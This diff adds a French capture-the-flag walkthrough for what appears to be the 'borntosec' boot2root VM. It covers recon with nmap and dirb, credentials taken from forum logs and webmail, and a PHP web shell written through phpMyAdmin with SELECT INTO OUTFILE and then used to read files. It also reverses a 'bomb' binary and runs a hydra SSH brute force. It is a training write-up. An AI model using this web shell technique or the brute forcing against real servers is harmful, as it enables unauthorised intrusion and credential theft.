@@ -1,0 +1,98 @@
+- trouver l'adresse ip de la VM:
+	etdiscover -i eth0 -r 10.0.2.0/24
+
+- scanner les ports de la VM:
+	nmap -v {IP}
+
+- trouver les differents dossiers present sur le site:
+	dirb https://{IP}
+	plusieur dossiers nous semble iterressant dont:
+	- forum/
+	- phpmyadmin/
+	- webmail/
+
+- trouver les identifiants de connexion au forum de lmezard:
+	nous nous somme interesse au forum en premier, nous decouvron un topic 'Probleme login ?'
+	avec un 'cmd + f' et en recherchant 'user' nous trouvons une ligne interessante
+	mot de passe ligne: Oct 5 08:45:29 (!q\]Ej?*5K5cy*AJ)
+	user ligne: Oct 5 08:46:01 (lmezard)
+
+- se connecter sur le forum en temps que lmezard
+
+- recuperer son adresse mail present dans son profil
+	laurie@borntosec.net
+
+- se connecter au web mail avec l'adresse mail et le meme mot de passe
+
+- recuperer les identifiants administrateur de la base de donnees present dans ses mails
+	root
+	Fg-'kKXBj87E:aJ$
+
+- se connecter a la base de donnees avec ces identifiants
+
+- dans la documentation d'installation du forum nous decouvrons que le dossier forum/templates_c/ doit etre configurer avec des permission d'ecriture
+
+- creer un script php dans le dossiers forum/templates_c via l'onglet SQL, affin de pouvoir executer des commande sur le serveur depuis l'interface de phpmyadmin:
+	SELECT "<pre><?php echo shell_exec($_GET['e']); ?></pre>" INTO OUTFILE '/var/www/forum/templates_c/shell.php';
+
+- recuperer les identifiants de connexion present dans le dossier home/LOOKATME/password grace au script php:
+	https://10.0.2.4/forum/templates_c/shell.php?e=cat%20/home/LOOKATME/password
+
+- utiliser le script ftp_fun.sh pour recuperer le mot de passe de l'utilisateur laurie:
+	bash ftp_fun.sh {IP}
+	330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+- se connecter a laurie en ssh avec ce mot de passe:
+	ssh laurie@{IP}
+
+- decompiler l'executable bomb avec ghidra pour trouver les mots de passe de chacunes des phases
+	- phase_1:
+		on sait que la premiere lettre est 'P'
+		simplement un string compare avec la chaine de caractere 'Public speaking is very easy.'
+	- phase_2:
+		on sait que la deuxieme lettre est '2'
+		convertie la chaine de caractere en une liste de 6 nombres
+		elle verifie que le premier nombre est un 1
+		effectue une boucle sur le reste des nombres
+		et verifie que le nombre a l'index + 1 est bien egale a index + 1 multiplier par le nombre a l'index actuel
+		ce qui donne la chaine de caractere 1 2 6 24 120 720
+	- phase_3:
+		on sait que la deuxieme lettre est 'b'
+		le mot de passe est en trois parties, un nombre, un caractere puis un autre nombre
+		un switch case est present indiquand plusieur possibilite pour le premier nombre, il faut que celui si soit compris entre 1 et 7
+		en fonction du premier nombre de deuxieme doit etre le meme que celui present dans la condition if correspondant
+		et a la fin le caractere initialiser dans le case correspondant au premier chiffre doit etre le meme que le caractere demander
+		donc dans cette phase 3 possibliter de mot de passe sont possible, 1 b 214, 2 b 755 et 7 b 780
+	- phase_4:
+		aucun indice
+		le mot de passe contient un seul nombres
+		un fonction est presente et calcule la valeur de fibonacci a l'index correspondant a ce nombre
+		et cette valeur doit etre 55
+		le mot de passe est donc 9
+	- phase_5:
+		on sait que la premiere lettre est 'o'
+		le mot de passe doit contenir 6 caracteres
+		le mask 0xf est appliquer sur toute les lettre gardant uniquement les 4 premier bits de poids faible
+		apres l'application de ce mask chacune des lettre deviennent des index compris entre 0 et 15
+		une nouvelle chaine de caractere est creer grace a ces index et une liste de 16 caracteres
+		et au final cette nouvelle chaine doit etre egale a la chine "giants"
+		plusieur solutions son donc possible
+		compiler puis lancer le script all_pahse_5_posibilities.c pour recuperer tout les mots de passes possibles
+	- phase_6:
+		on sait que la premiere lettre est '4'
+		un liste chainee est presente, les maillons possedent des int
+		et les maillons doivent etre trier par ordre croissant en fonction de la valeur des int
+		le mot de passe est la liste des index des maillons de depart dans l'orde qu'il sont au final
+
+- compiler et executer le script create_all_password.c et enregistrer le resultat dans un fichier
+	ce qui genere tout les mots de passes possibles pour thor
+	on utilise ensuite hidra pour tous les tester (hydra -l thor -P {passords_file} ssh://{IP})
+
+- se connecter a thor avec le mot de passe resultant de hidra
+	nous decouvront que le fichier turtle est un programme code dans le language turtle
+	nous avons donc developer un script generant, via le fichier turtle, un programme python executant le programme turtle dans une fenetre graphique
+	executer le script turtleGen.py
+
+- convertir le mot de passe resultant du script en md5 (echo -n "SLASH" | md5sum)
+
+- se connecter a zaz avec ce mot de passe
